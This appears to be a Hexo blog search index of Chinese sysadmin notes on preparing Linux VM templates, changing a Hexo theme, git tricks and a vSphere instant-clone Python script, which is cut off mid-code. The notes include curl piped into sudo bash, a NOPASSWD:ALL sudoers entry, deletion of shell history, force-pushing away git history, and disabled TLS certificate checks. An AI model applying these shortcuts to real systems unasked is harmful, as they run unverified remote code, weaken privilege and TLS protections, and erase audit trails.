yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span class="token function">sudo</span> yum makecache fast<span class="token punctuation">;</span><span class="token function">sudo</span> yum -y <span class="token function">install</span> docker-ce<span class="token punctuation">;</span><span class="token function">sudo</span> systemctl start docker<span class="token punctuation">;</span><span class="token function">sudo</span> systemctl <span class="token function">enable</span> docker<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="gitlab-runner"><a href="#gitlab-runner" class="headerlink" title="gitlab-runner"></a>gitlab-runner</h3><pre class="line-numbers language-bash"><code class="language-bash">curl -L https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.deb.sh <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">bash</span><span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">usermod</span> -aG docker gitlab-runner<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="无密码sudo到root"><a href="#无密码sudo到root" class="headerlink" title="无密码sudo到root"></a>无密码sudo到root</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span><span class="token punctuation">;</span><span class="token function">chmod</span> +w /etc/sudoers<span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"xyzz ALL=(ALL:ALL) NOPASSWD:ALL"</span> <span class="token operator">>></span> /etc/sudoers<span class="token punctuation">;</span><span class="token function">chmod</span> -w /etc/sudoers<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="vim配置"><a href="#vim配置" class="headerlink" title="vim配置"></a>vim配置</h3><pre class="line-numbers language-bash"><code class="language-bash">curl https://raw.githubusercontent.com/chnxyzz/linux_install/master/vim/vimrc.txt -o ~/.vimrc<span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">cp</span> ~/.vimrc /root/.vimrc<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="清除shell记录"><a href="#清除shell记录" class="headerlink" title="清除shell记录"></a>清除shell记录</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> ~/.zsh_history ~/.bash_history /root/.zsh_history /root/.bash_history<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="vsphere相关"><a href="#vsphere相关" class="headerlink" title="vsphere相关"></a>vsphere相关</h3><p>打开自动升级vmtools的功能</p><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><h3 id="debian"><a href="#debian" class="headerlink" title="debian"></a>debian</h3><p>debian的情况和ubuntu稍有不同，不过馋的是他的稳定和资源占用少，还是搞了一个，顺便把普通用户不给sudo的权限，想root就必须密码或者提权<br>所以sudo失效了</p><h4 id="换源-1"><a href="#换源-1" class="headerlink" title="换源"></a>换源</h4><p>aliyun没看到debian10，先用bfsu顶上</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> -i <span class="token string">'s/deb.debian.org/mirrors.bfsu.edu.cn/g'</span> /etc/apt/sources.list<span class="token punctuation">;</span><span class="token function">sed</span> -i <span class="token string">'s/security.debian.org/mirrors.bfsu.edu.cn/g'</span> /etc/apt/sources.list<span class="token punctuation">;</span><span class="token function">apt-get</span> update<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h4><p>添加open-vm-tools</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> DEBIAN_FRONTEND<span class="token operator">=</span>noninteractive<span class="token punctuation">;</span><span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">sudo</span> <span class="token function">wget</span> curl unzip netcat autojump open-vm-tools <span class="token function">htop</span> net-tools vim <span class="token function">bash</span> zsh <span class="token function">git</span> -y<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="ssh安全"><a href="#ssh安全" class="headerlink" title="ssh安全"></a>ssh安全</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> -i <span class="token string">'s/#PasswordAuthentication yes/PasswordAuthentication no/g'</span> /etc/ssh/sshd_config<span class="token punctuation">;</span>systemctl restart sshd<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="manjaro-architect"><a href="#manjaro-architect" class="headerlink" title="manjaro-architect"></a>manjaro-architect</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>安装很繁琐，记得转好openssh</p><h4 id="设置网卡及sshd"><a href="#设置网卡及sshd" class="headerlink" title="设置网卡及sshd"></a>设置网卡及sshd</h4><p>装好了网卡不dhcp</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl <span class="token function">enable</span> dhcpcd<span class="token punctuation">;</span>systemctl restart dhcpcd<span class="token punctuation">;</span>systemctl <span class="token function">enable</span> sshd<span class="token punctuation">;</span>systemctl restart sshd<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="换源-2"><a href="#换源-2" class="headerlink" title="换源"></a>换源</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> pacman-mirrors -i -c China -m rank<span class="token punctuation">;</span><span class="token function">sudo</span> pacman -Syy<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="swapfile"><a href="#swapfile" class="headerlink" title="swapfile"></a>swapfile</h4><p>我用的是brtfs，所以先有点不同(<a href="https://wiki.manjaro.org/index.php?title=Swap">https://wiki.manjaro.org/index.php?title=Swap</a>)</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> swapfile<span class="token operator">=</span>/swap.img<span class="token punctuation">;</span><span class="token function">sudo</span> truncate -s 0 <span class="token variable">$swapfile</span><span class="token function">sudo</span> chattr +C <span class="token variable">$swapfile</span><span class="token punctuation">;</span><span class="token function">sudo</span> btrfs property <span class="token keyword">set</span> <span class="token variable">$swapfile</span> compression none<span class="token punctuation">;</span><span class="token function">sudo</span> fallocate -l 2G <span class="token variable">$swapfile</span><span class="token punctuation">;</span><span class="token function">sudo</span> mkswap <span class="token variable">$swapfile</span><span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">chmod</span> u<span class="token operator">=</span>rw,go<span class="token operator">=</span> <span class="token variable">$swapfile</span><span class="token punctuation">;</span><span class="token function">sudo</span> swapon <span class="token variable">$swapfile</span><span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">bash</span> -c <span class="token string">"echo <span class="token variable">$swapfile</span> none swap defaults 0 0 >> /etc/fstab"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然现在是0byte，但是在用到swap时候就会写入，直到最大容量，和mac有点类似。</p><h4 id="安装软件-1"><a href="#安装软件-1" class="headerlink" title="安装软件"></a>安装软件</h4><p>添加open-vm-tools</p><pre class="line-numbers language-bash"><code class="language-bash">pacman -S <span class="token function">sudo</span> <span class="token function">wget</span> curl unzip gnu-netcat open-vm-tools <span class="token function">htop</span> net-tools vim <span class="token function">bash</span> zsh <span class="token function">git</span><span class="token punctuation">;</span><span class="token function">sudo</span> systemctl <span class="token function">enable</span> vmtoolsd<span class="token punctuation">;</span><span class="token function">sudo</span> systemctl restart vmtoolsd<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>目前pacman无法安装autojump<br>找了一种方法，不过为了安全暂时不想尝试,把autojump先屏蔽了</p><pre class="line-numbers language-bash"><code class="language-bash">1. <span class="token function">wget</span> https://aur.archlinux.org/cgit/aur.git/snapshot/autojump.tar.gz2. <span class="token function">tar</span> -xzvf autojump.tar.gz3. <span class="token function">cd</span> autojump <span class="token operator">&amp;&amp;</span> vim PKGBUILD<span class="token comment" spellcheck="true"># depends=('python>=3.7')</span><span class="token comment" spellcheck="true"># _python=python3.7</span>4. replace all the 3.8 to 3.75. makepkg6. <span class="token function">sudo</span> pacman -U autojump-22.5.3-5-any.pkg.tar.xz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ssh安全-1"><a href="#ssh安全-1" class="headerlink" title="ssh安全"></a>ssh安全</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> -i <span class="token string">'s/#PasswordAuthentication yes/PasswordAuthentication no/g'</span> /etc/ssh/sshd_config<span class="token punctuation">;</span>systemctl restart sshd<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="parrot"><a href="#parrot" class="headerlink" title="parrot"></a>parrot</h3><p>目前安装版本<code>4.9.1</code></p><h4 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span><span class="token punctuation">;</span><span class="token function">apt-get</span> update<span class="token punctuation">;</span><span class="token function">apt-get</span> <span class="token function">install</span> -y openssh-server<span class="token punctuation">;</span><span class="token function">sed</span> -i <span class="token string">'s/#PasswordAuthentication yes/PasswordAuthentication no/g'</span> /etc/ssh/sshd_config<span class="token punctuation">;</span>systemctl <span class="token function">enable</span> <span class="token function">ssh</span> <span class="token operator">&amp;&amp;</span> systemctl restart <span class="token function">ssh</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="换源和update"><a href="#换源和update" class="headerlink" title="换源和update"></a>换源和update</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span><span class="token punctuation">;</span><span class="token function">sed</span> -i <span class="token string">"s/deb.parrot.sh/mirrors.bfsu.edu.cn/g"</span> /etc/apt/sources.list.d/parrot.list<span class="token punctuation">;</span><span class="token function">apt-get</span> update<span class="token punctuation">;</span><span class="token function">sudo</span> parrot-upgrade<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="swap"><a href="#swap" class="headerlink" title="swap"></a>swap</h4><p>/etc/fstab里面有了swapfile一栏</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> swapfile<span class="token operator">=</span>/swapfile<span class="token punctuation">;</span><span class="token function">sudo</span> truncate -s 0 <span class="token variable">$swapfile</span><span class="token function">sudo</span> chattr +C <span class="token variable">$swapfile</span><span class="token punctuation">;</span><span class="token function">sudo</span> btrfs property <span class="token keyword">set</span> <span class="token variable">$swapfile</span> compression none<span class="token punctuation">;</span><span class="token function">sudo</span> fallocate -l 2G <span class="token variable">$swapfile</span><span class="token punctuation">;</span><span class="token function">sudo</span> mkswap <span class="token variable">$swapfile</span><span class="token punctuation">;</span><span class="token function">sudo</span> <span class="token function">chmod</span> u<span class="token operator">=</span>rw,go<span class="token operator">=</span> <span class="token variable">$swapfile</span><span class="token punctuation">;</span><span class="token function">sudo</span> swapon <span class="token variable">$swapfile</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="更新完了源也毁了"><a href="#更新完了源也毁了" class="headerlink" title="更新完了源也毁了"></a>更新完了源也毁了</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> -i <span class="token string">"s/deb.parrot.sh/mirrors.bfsu.edu.cn/g"</span> /etc/apt/sources.list.d/parrot.list<span class="token punctuation">;</span><span class="token function">apt-get</span> update<span class="token punctuation">;</span><span class="token function">export</span> DEBIAN_FRONTEND<span class="token operator">=</span>noninteractive<span class="token punctuation">;</span><span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">sudo</span> <span class="token function">wget</span> curl unzip netcat autojump <span class="token function">unrar</span> net-tools vim <span class="token function">bash</span> zsh <span class="token function">git</span> -y<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h3><p>版本7.7</p><h4 id="设置locale"><a href="#设置locale" class="headerlink" title="设置locale"></a>设置locale</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"export LC_ALL=en_US.UTF-8"</span>  <span class="token operator">>></span>  /etc/profile<span class="token keyword">echo</span> <span class="token string">"export LC_CTYPE=en_US.UTF-8"</span>  <span class="token operator">>></span>  /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="centos8"><a href="#centos8" class="headerlink" title="centos8"></a>centos8</h3><p>版本8.2</p><h3 id="换源-3"><a href="#换源-3" class="headerlink" title="换源"></a>换源</h3><p>好像不需要换，<code>dnf update</code>速度飞起</p><h3 id="epel"><a href="#epel" class="headerlink" title="epel"></a>epel</h3><pre class="line-numbers language-bash"><code class="language-bash">dnf <span class="token function">install</span> -y https://mirrors.aliyun.com/epel/epel-release-latest-8.noarch.rpm<span class="token punctuation">;</span><span class="token function">sed</span> -i <span class="token string">'s|^#baseurl=https://download.fedoraproject.org/pub|baseurl=https://mirrors.aliyun.com|'</span> /etc/yum.repos.d/epel*<span class="token punctuation">;</span><span class="token function">sed</span> -i <span class="token string">'s|^metalink|#metalink|'</span> /etc/yum.repos.d/epel*<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="安装软件-2"><a href="#安装软件-2" class="headerlink" title="安装软件"></a>安装软件</h3><pre class="line-numbers language-bash"><code class="language-bash">dnf <span class="token function">install</span> -y <span class="token function">sudo</span> <span class="token function">wget</span> curl unzip python3 nmap-ncat open-vm-tools <span class="token function">htop</span> net-tools vim <span class="token function">bash</span> zsh <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="autojump"><a href="#autojump" class="headerlink" title="autojump"></a>autojump</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> ~<span class="token punctuation">;</span><span class="token function">git</span> clone git://github.com/wting/autojump.git<span class="token punctuation">;</span><span class="token function">ln</span> -s /usr/bin/python3 /usr/bin/python<span class="token punctuation">;</span><span class="token function">cd</span> autojump<span class="token punctuation">;</span>./install.py or ./uninstall.py<span class="token punctuation">;</span><span class="token function">cd</span> <span class="token punctuation">..</span> <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -rf autojump<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把下面的加入<code>~/.zshrc</code>里面,目测manjaro应该也可以</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token punctuation">[</span> -s /root/.autojump/etc/profile.d/autojump.sh <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">source</span> /root/.autojump/etc/profile.d/autojump.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>autojump成功</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>比debian占用的内存还少，馋了馋了<br>自己用的几款linux的母机默认情况下内存占用量，再用<code>ps -ef | wc -l</code>看看进程数</p><table><thead><tr><th align="center">系统</th><th align="center">内存占用量</th><th align="center">进程数</th></tr></thead><tbody><tr><td align="center">ubuntu18.04.4</td><td align="center">140M+</td><td align="center">161</td></tr><tr><td align="center">ubuntu20.04.1</td><td align="center">190M+</td><td align="center">215</td></tr><tr><td align="center">centos7.7</td><td align="center">195M+</td><td align="center">177</td></tr><tr><td align="center">debian10.5</td><td align="center">95M+</td><td align="center">108</td></tr><tr><td align="center">manjaro20.0.3</td><td align="center">91M+</td><td align="center">147</td></tr><tr><td align="center">parrot4.9.1</td><td align="center">360M+</td><td align="center">206</td></tr><tr><td align="center">centos8</td><td align="center">225M+</td><td align="center">231</td></tr></tbody></table><p>debian真香</p>]]></content>
      
      
      <categories>
          
          <category> smalltrick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> instant clone </tag>
            
            <tag> linux server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo主题更换加npm升级</title>
      <link href="/2020/08/14/hexo-zhu-ti-geng-huan-jia-npm-sheng-ji/"/>
      <url>/2020/08/14/hexo-zhu-ti-geng-huan-jia-npm-sheng-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="更换hexo主题"><a href="#更换hexo主题" class="headerlink" title="更换hexo主题"></a>更换hexo主题</h1><p>从yilia换到matery<br>所有大写在github page会出现错误，所以更改名称</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> themes<span class="token punctuation">;</span><span class="token function">git</span> clone https://github.com/blinkfox/hexo-theme-matery.git<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>添加npm包</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> i -S hexo-prism-plugin<span class="token punctuation">;</span><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-search --save<span class="token punctuation">;</span><span class="token function">npm</span> i hexo-permalink-pinyin --save<span class="token punctuation">;</span><span class="token function">npm</span> i --save hexo-wordcount<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="更新hexo的包"><a href="#更新hexo的包" class="headerlink" title="更新hexo的包"></a>更新hexo的包</h1><p>之前的包还是两年前的，用npm进行更新</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> -g npm-checknpm-check<span class="token function">npm</span> <span class="token function">install</span> -g <span class="token function">npm</span><span class="token function">npm</span> <span class="token function">install</span> -g npm-upgradenpm-upgrade<span class="token function">npm</span> update <span class="token function">rm</span> -rf node_modules <span class="token operator">&amp;&amp;</span> <span class="token function">npm</span> <span class="token function">install</span> --force<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>国内源不可audit,</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> ERR<span class="token operator">!</span> code ENOAUDIT<span class="token function">npm</span> ERR<span class="token operator">!</span> audit Your configured registry <span class="token punctuation">(</span>https://registry.npm.taobao.org/<span class="token punctuation">)</span> does not support audit requests.<span class="token function">npm</span> ERR<span class="token operator">!</span> A complete log of this run can be found in:<span class="token function">npm</span> ERR<span class="token operator">!</span>     /root/.npm/_logs/2020-08-15T15_40_57_743Z-debug.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>换回去</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token keyword">set</span> registry https://registry.npmjs.org<span class="token function">npm</span> audit<span class="token function">npm</span> audit fix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> smalltrick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> npm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git清空所有记录</title>
      <link href="/2020/08/14/git-qing-kong-suo-you-ji-lu/"/>
      <url>/2020/08/14/git-qing-kong-suo-you-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="git的一些操作"><a href="#git的一些操作" class="headerlink" title="git的一些操作"></a>git的一些操作</h1><h2 id="清空所有commit"><a href="#清空所有commit" class="headerlink" title="清空所有commit"></a>清空所有commit</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> checkout --orphan latest_branch<span class="token punctuation">;</span><span class="token function">git</span> add -A<span class="token punctuation">;</span><span class="token function">git</span> commit -m <span class="token string">"commit message"</span><span class="token punctuation">;</span><span class="token function">git</span> branch -D master<span class="token punctuation">;</span><span class="token function">git</span> branch -m master<span class="token punctuation">;</span><span class="token function">git</span> push -f origin master<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="清空远程仓库"><a href="#清空远程仓库" class="headerlink" title="清空远程仓库"></a>清空远程仓库</h2><p>不清空.git直接清空仓库文件就git pull下来。删了所有文件，然后三连</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> add <span class="token keyword">.</span> <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> commit -m <span class="token string">"delall"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> push<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="gitignore不起作用"><a href="#gitignore不起作用" class="headerlink" title="gitignore不起作用"></a>gitignore不起作用</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">rm</span> -r --cached <span class="token keyword">.</span><span class="token function">git</span> add <span class="token keyword">.</span><span class="token function">git</span> commit -m <span class="token string">'update .gitignore'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> smalltrick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> useful </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vsphere 即时克隆</title>
      <link href="/2020/08/13/vsphere-ji-shi-ke-long/"/>
      <url>/2020/08/13/vsphere-ji-shi-ke-long/</url>
      
        <content type="html"><![CDATA[<h1 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h1><p>vsphere6.7即以上的instant clone，使用脚本进行设置<br>属于能用就行的东西，不想优化</p><a id="more"></a><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><pre class="line-numbers language-bash"><code class="language-bash">conda create -n vsphere python<span class="token operator">=</span>3.7<span class="token function">source</span> activate vsphereorconda activate vspherepython -m pip <span class="token function">install</span> -i https://mirrors.aliyun.com/pypi/simple pyvmomi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><p>instant_clone.py</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># encoding=utf-8</span><span class="token keyword">from</span> common <span class="token keyword">import</span> info<span class="token keyword">import</span> atexit<span class="token keyword">import</span> requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3 <span class="token keyword">as</span> urllib3<span class="token keyword">import</span> ssl<span class="token keyword">from</span> pyVmomi <span class="token keyword">import</span> vim<span class="token keyword">from</span> pyVim<span class="token punctuation">.</span>connect <span class="token keyword">import</span> SmartConnect<span class="token punctuation">,</span> Disconnect<span class="token keyword">import</span> time<span class="token keyword">from</span> tools <span class="token keyword">import</span> tasks<span class="token triple-quoted-string string">""" Waits and provides updates on a vSphere task"""</span><span class="token keyword">def</span> <span class="token function">WaitTask</span><span class="token punctuation">(</span>task<span class="token punctuation">,</span> actionName<span class="token operator">=</span><span class="token string">'job'</span><span class="token punctuation">,</span> hideResult<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#print 'Waiting for %s to complete.' % actionName  </span>    <span class="token keyword">if</span> task <span class="token operator">==</span>None<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'no value'</span>    <span class="token keyword">while</span> task<span class="token punctuation">.</span>info<span class="token punctuation">.</span>state <span class="token operator">==</span> vim<span class="token punctuation">.</span>TaskInfo<span class="token punctuation">.</span>State<span class="token punctuation">.</span>running<span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>task<span class="token punctuation">.</span>info<span class="token punctuation">)</span>    <span class="token keyword">if</span> task<span class="token punctuation">.</span>info<span class="token punctuation">.</span>state <span class="token operator">==</span> vim<span class="token punctuation">.</span>TaskInfo<span class="token punctuation">.</span>State<span class="token punctuation">.</span>success<span class="token punctuation">:</span>       <span class="token keyword">if</span> task<span class="token punctuation">.</span>info<span class="token punctuation">.</span>result <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token operator">and</span> <span class="token operator">not</span> hideResult<span class="token punctuation">:</span>          out <span class="token operator">=</span> <span class="token string">'%s completed successfully, result: %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>actionName<span class="token punctuation">,</span> task<span class="token punctuation">.</span>info<span class="token punctuation">.</span>result<span class="token punctuation">)</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>          out <span class="token operator">=</span> <span class="token string">'%s completed successfully.'</span> <span class="token operator">%</span> actionName    <span class="token keyword">else</span><span class="token punctuation">:</span>       out <span class="token operator">=</span> <span class="token string">'%s did not complete successfully: %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>actionName<span class="token punctuation">,</span> task<span class="token punctuation">.</span>info<span class="token punctuation">.</span>error<span class="token punctuation">)</span>       <span class="token keyword">print</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span>       <span class="token keyword">raise</span> task<span class="token punctuation">.</span>info<span class="token punctuation">.</span>error <span class="token comment" spellcheck="true"># should be a Fault... check XXX</span>    <span class="token comment" spellcheck="true"># may not always be applicable, but can't hurt.</span>    <span class="token keyword">return</span> task<span class="token punctuation">.</span>info<span class="token punctuation">.</span>result<span class="token keyword">def</span> <span class="token function">get_obj</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> vimtype<span class="token punctuation">,</span> name<span class="token punctuation">,</span> folder<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>    obj <span class="token operator">=</span> None    <span class="token keyword">if</span> <span class="token operator">not</span> folder<span class="token punctuation">:</span>        folder <span class="token operator">=</span> content<span class="token punctuation">.</span>rootFolder    container <span class="token operator">=</span> content<span class="token punctuation">.</span>viewManager<span class="token punctuation">.</span>CreateContainerView<span class="token punctuation">(</span>folder<span class="token punctuation">,</span> vimtype<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> container<span class="token punctuation">.</span>view<span class="token punctuation">:</span>        <span class="token keyword">if</span> item<span class="token punctuation">.</span>name <span class="token operator">==</span> name<span class="token punctuation">:</span>            obj <span class="token operator">=</span> item            <span class="token keyword">break</span>    <span class="token keyword">return</span> obj<span class="token comment" spellcheck="true"># 开始连接vcenter</span>si <span class="token operator">=</span> Nonecontext <span class="token operator">=</span> None<span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>ssl<span class="token punctuation">,</span> <span class="token string">'SSLContext'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    context <span class="token operator">=</span> ssl<span class="token punctuation">.</span>SSLContext<span class="token punctuation">(</span>ssl<span class="token punctuation">.</span>PROTOCOL_SSLv23<span class="token punctuation">)</span>    context<span class="token punctuation">.</span>verify_mode <span class="token operator">=</span> ssl<span class="token punctuation">.</span>CERT_NONE<span class="token keyword">if</span> context<span class="token punctuation">:</span>    si <span class="token operator">=</span> SmartConnect<span class="token punctuation">(</span>host<span class="token operator">=</span>info<span class="token punctuation">.</span>host<span class="token punctuation">,</span> port<span class="token operator">=</span>int<span class="token punctuation">(</span>info<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">,</span> user<span class="token operator">=</span>info<span class="token punctuation">.</span>user<span class="token punctuation">,</span>                      pwd<span class="token operator">=</span>info<span class="token punctuation">.</span>password<span class="token punctuation">,</span> sslContext<span class="token operator">=</span>context<span class="token punctuation">)</span>atexit<span class="token punctuation">.</span>register<span class="token punctuation">(</span>Disconnect<span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Connected to vCenter Server"</span><span class="token punctuation">)</span>content <span class="token operator">=</span> si<span class="token punctuation">.</span>RetrieveContent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 获取datacenter</span>datacenter <span class="token operator">=</span> get_obj<span class="token punctuation">(</span>content<span class="token punctuation">,</span> <span class="token punctuation">[</span>vim<span class="token punctuation">.</span>Datacenter<span class="token punctuation">]</span><span class="token punctuation">,</span> info<span class="token punctuation">.</span>datacenter_name<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token operator">not</span> datacenter<span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Couldn't find the Datacenter with the provided name "</span> <span class="token string">"'&amp;#123;&amp;#125;'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>info<span class="token punctuation">.</span>datacenter_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">instant_clone</span><span class="token punctuation">(</span>new_vm_name<span class="token punctuation">,</span>template_name<span class="token punctuation">,</span>ResourcePool<span class="token operator">=</span><span class="token string">'即时克隆'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 获取vm</span>    vm_folder <span class="token operator">=</span> datacenter<span class="token punctuation">.</span>vmFolder    vm_template <span class="token operator">=</span> get_obj<span class="token punctuation">(</span>content<span class="token 